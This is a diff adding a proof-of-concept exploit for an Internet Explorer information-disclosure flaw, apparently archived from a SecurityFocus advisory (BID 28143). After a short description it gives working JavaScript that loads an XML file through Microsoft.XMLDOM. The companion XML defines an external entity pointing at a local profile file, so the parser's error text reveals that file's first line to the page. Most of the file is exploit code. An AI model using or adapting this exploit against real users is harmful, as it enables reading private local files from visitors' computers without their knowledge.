@@ -1,0 +1,131 @@
+source: http://www.securityfocus.com/bid/28143/info
+
+Microsoft Internet Explorer is prone to a remote information-disclosure vulnerability because of a flaw in the interaction between JavaScript and XML processing in Internet Explorer.
+
+To exploit this issue, an attacker must entice an unsuspecting user to visit a malicious website.
+
+Successfully exploiting this issue allows remote attackers to gain access to the first line of arbitrary files located on computers running the vulnerable application.
+
+<script language="JavaScript">
+
+
+
+	// load new XML document.
+
+	var xmlDoc = new ActiveXObject("Microsoft.XMLDOM");
+
+
+
+	function XML(file,list) {
+
+
+
+		/* 
+
+		Available error messages:
+
+		------------------------
+
+		:: parseError.errorCode
+
+		:: parseError.reason
+
+		:: parseError.line
+
+		:: parseError.linePos
+
+		:: parseError.srcText 
+
+		------------------------
+
+		*/
+
+		
+
+    	xmlDoc.async="false";
+
+		xmlDoc.validateOnParse = "true";
+
+		xmlDoc.onreadystatechange=chk;
+
+    	xmlDoc.load(file);
+
+		
+
+		if(list) {
+
+		listXML(xmlDoc.documentElement)
+
+		} else {
+
+		document.write(xmlDoc.parseError.srcText);
+
+		}
+
+	
+
+	}
+
+	
+
+	function chk() {  
+
+ 		return (xmlDoc.readyState!=4) ? false:true;
+
+	} 
+
+
+
+	function listXML(xmlsrc) {
+
+		// for valid DTD files, list the complete tree
+
+		if(xmlsrc.hasChildNodes()) {
+
+		document.write('<ul><li>');
+
+		document.write(xmlsrc.tagName +' => ');
+
+		for(i = 0; i < xmlsrc.childNodes.length; ++i) {
+
+			// recursive walk
+
+			listXML(xmlsrc.childNodes(i));
+
+		}
+
+		document.write('</li></ul>');
+
+		} else {
+
+		document.write(xmlsrc.text);
+
+		}
+
+	}
+
+	
+
+	XML("28143.xml");
+
+	
+
+</script>
+
+==========================================28143.xml=======================================
+
+<?xml version="1.0" encoding="UTF-8" standalone="yes" ?>
+
+<!DOCTYPE show [
+
+<!ENTITY % name SYSTEM "file://localhost/FirefoxPortable/Data/profile/kf.txt">
+
+%name;
+
+]>
+
+<show>
+
+%name;
+
+</show>
